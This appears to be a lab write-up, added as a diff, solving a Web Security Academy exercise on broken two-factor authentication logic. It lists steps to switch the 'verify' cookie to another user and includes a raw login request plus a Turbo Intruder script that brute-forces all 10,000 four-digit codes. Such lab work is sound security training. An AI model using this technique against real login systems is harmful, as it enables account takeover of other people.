@@ -1,0 +1,45 @@
+1. With Burp running, log in to your own account and investigate the 2FA verification process. 
+2. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed. Log out of your account. 
+3. Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos. 
+4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code. 
+5. Send the POST /login2 request to Burp Intruder. In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. 
+6. Brute-force the verification code. Load the 302 response in your browser. Click "My account" to solve the lab. 
+
+# POST request in Turbo Intruder
+
+POST /login2 HTTP/1.1
+Host: ac5d1fae1ebb5794804133af001a0080.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac5d1fae1ebb5794804133af001a0080.web-security-academy.net/login2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Connection: close
+Cookie: session=42wPhpFee6nKJO94QxBIVgdWTz6KQ6yo; verify=carlos
+Upgrade-Insecure-Requests: 1
+
+csrf=KCs3pr0zUnAFpTgLuPepwtx1VVbtzJyQ&mfa-code=%s
+
+GET /login-steps/second HTTP/1.1
+Cookie: account=victim-user
+
+# Python script in Turbo Intruder
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+			   concurrentConnections=5,
+			   requestsPerConnection=1,
+			   pipeline=False
+			   )
+    engine.start()
+			   
+    for i in range(0, 10000):
+	engine.queue(target.req, "{:04}".format(i))
+
+
+def handleResponse(req, interesting):
+    if 'Incorrect security code' not in req.response:
+	table.add(req)
+
